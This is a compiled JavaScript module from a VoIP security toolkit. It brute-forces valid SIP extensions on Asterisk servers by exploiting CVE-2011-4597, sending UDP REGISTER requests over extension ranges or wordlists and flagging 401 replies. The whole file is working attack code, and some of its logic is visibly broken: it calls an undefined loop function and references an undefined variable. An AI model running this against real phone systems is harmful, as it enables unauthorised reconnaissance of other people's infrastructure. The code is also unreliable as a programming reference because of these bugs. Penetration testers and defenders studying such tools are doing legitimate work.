// Generated by CoffeeScript 1.6.3
/*

Copyright (C) 2013, Jesus Perez <jesusprubio gmail com>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

var AsteroidsConn, Grammar, Parser, Printer, SipBruteExtAst, SipMessage, Utils, dgram, fs;

SipMessage = require("../tools/sipMessage.coffee").SipMessage;

AsteroidsConn = require("../tools/asteroidsConn.coffee").AsteroidsConn;

Parser = require("../tools/parser.coffee").Parser;

Printer = require("../tools/printer.coffee").Printer;

Utils = require("../tools/utils.coffee").Utils;

Grammar = require("../tools/grammar").Grammar;

dgram = require("dgram");

fs = require("fs");

/*
Vulnerability: http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4597

Affected versions: 
- In 1.4 and 1.6.2, if one setting was nat=yes or nat=route and the other was either 
 	nat=no or nat=never. In 1.8 and 10, when one was nat=force_rport or nat=yes and the 
 	other was nat=no or nat=comedia. 
- Whith default configuration are vunerable version 1.4.x before 1.4.43, 1.6.x before
	1.6.2.21, and 1.8.x before 1.8.7.2. 
-	Only over UDP Protocol.
*/


exports.SipBruteExtAst = SipBruteExtAst = (function() {
  var callback, globalNat, oneEnum, parseReply, printHasNat, runWithInfo, vulnerable;

  function SipBruteExtAst() {}

  globalNat = "";

  vulnerable = false;

  callback = function() {
    if (globalNat === "") {
      return Printer.error("SipBruteExtAst: Connection problem: Can't reach the target or no response");
    }
  };

  parseReply = function(msg, testExt) {
    var code;
    code = Parser.parseCode(msg);
    if (code === "401") {
      vulnerable = true;
      return Printer.printEnum(testExt, "Auth");
    }
  };

  oneEnum = function(target, port, srcHost, testExt) {
    var conn2, lport, msgObj, msgSend;
    lport = Utils.randomPort2();
    msgObj = new SipMessage("REGISTER", "", target, port, srcHost, lport, testExt, "", "UDP", "", "", "", false, "", "", "", "", "", "");
    msgSend = String(msgObj.create());
    conn2 = new AsteroidsConn(target, port, "", "UDP", lport);
    conn2.on("newMessage", function(stream) {
      if (globalNat === "no") {
        return parseReply(stream, testExt);
      }
    });
    conn2.on("error", function(error) {});
    conn2.send(msgSend);
    Printer.highlight("Last tested (not valid) extension ");
    Printer.normal("\"" + testExt + "\"\n");
    return Printer.removeCursor();
  };

  printHasNat = function(hasNat) {
    return Printer.highlight("\nAsterisk appears to have global nat = " + hasNat + "\n");
  };

  runWithInfo = function(target, port, srcHost, rangeExt, delay) {
    var doLoopNum2, rangeExtParsed,
      _this = this;
    printHasNat(globalNat);
    if (Grammar.fileRE.exec(rangeExt)) {
      return fs.readFile(rangeExt, function(err, data) {
        var doLoopString2, extensions, splitData,
          _this = this;
        if (err) {
          return Printer.error("sipBruteExtAst: readFile: " + err);
        } else {
          extensions = data;
          splitData = data.toString().split("\n");
          doLoopString2 = function(i) {
            return setTimeout(function() {
              oneEnum(target, port, srcHost, splitData[i]);
              if (i < splitData.length - 1) {
                return doLoopString2(i + 1);
              }
            }, delay);
          };
          return doLoopString(0);
        }
      });
    } else {
      if (Grammar.extRangeRE.exec(rangeExt)) {
        rangeExtParsed = Parser.parseExtRange(rangeExt);
        doLoopNum2 = function(i) {
          return setTimeout(function() {
            oneEnum(target, port, srcHost, i);
            if (i < rangeExtParsed.maxExt) {
              return doLoopNum2(parseInt(i, 10) + 1);
            }
          }, delay);
        };
        return doLoopNum2(rangeExtParsed.minExt);
      } else {
        return oneEnum(target, port, srcHost, rangeExt);
      }
    }
  };

  SipBruteExtAst.run = function(target, port, srcHost, rangeExt, delay) {
    var conn, conn5060, firstTime, lport, msgObj, msgSend;
    firstTime = true;
    if (/:/.test(target)) {
      target = Utils.normalize6(target);
    }
    lport = Utils.randomPort2();
    msgObj = new SipMessage("REGISTER", "", target, port, srcHost, lport, "olakease", "", "UDP", "", "", "", false, "", "", "", "", "", "");
    msgSend = String(msgObj.create());
    conn = new AsteroidsConn(target, port, "", "UDP", lport);
    conn.on("newMessage", function(stream) {
      if (firstTime) {
        globalNat = "yes";
        firstTime = false;
        return runWithInfo(target, port, srcHost, rangeExt, delay);
      }
    });
    conn.on("error", function(error) {});
    conn5060 = dgram.createSocket("udp4");
    conn5060.bind(5060);
    conn5060.on("message", function(msg, rinfo) {
      if (firstTime) {
        globalNat = "no";
        firstTime = false;
        return runWithInfo(target, port, srcHost, rangeExt, delay);
      } else {
        if (globalNat === "yes") {
          parseReply(stream);
          return console.log(stream);
        }
      }
    });
    conn5060.on("error", function(error) {
      return Printer.error("SipBruteExtAst: conn5060: " + error);
    });
    setTimeout(callback, 5000);
    return conn.send(msgSend, "UDP", lport);
  };

  return SipBruteExtAst;

})();
